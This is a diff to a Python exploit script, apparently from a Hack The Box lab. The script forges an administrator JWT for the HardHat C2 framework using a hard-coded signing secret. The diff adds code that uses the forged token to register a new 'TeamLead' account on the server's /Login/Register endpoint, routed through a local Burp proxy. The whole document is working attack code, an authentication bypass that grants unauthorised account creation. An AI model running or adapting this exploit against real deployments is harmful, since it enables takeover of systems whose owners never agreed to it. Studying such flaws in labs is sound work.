@@ -4,15 +4,16 @@ import datetime
 import uuid
 import requests
 
-rhost = 'localhost:5000'
+rhost = '127.0.0.1:5000'
 
 # Craft Admin JWT
 secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
-issuer = "backfire.htb"
+issuer = "hardhatc2.com"
 now = datetime.datetime.utcnow()
 
 expiration = now + datetime.timedelta(days=28)
 payload = {
+
     "sub": "HardHat_Admin",  
     "jti": str(uuid.uuid4()),
     "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
@@ -26,3 +27,20 @@ payload = {
 token = jwt.encode(payload, secret, algorithm="HS256")
 print("Generated JWT:")
 print(token)
+
+# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
+burp0_url = f"https://{rhost}/Login/Register"
+
+burp0_headers = {
+  "Authorization": f"Bearer {token}",
+  "Content-Type": "application/json"
+}
+
+burp0_json = {
+  "password": "gianlush",
+  "role": "TeamLead",
+  "username": "gianlush"
+}
+
+r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False, proxies={"https":"http://localhost:8080"})
+print(r.text)
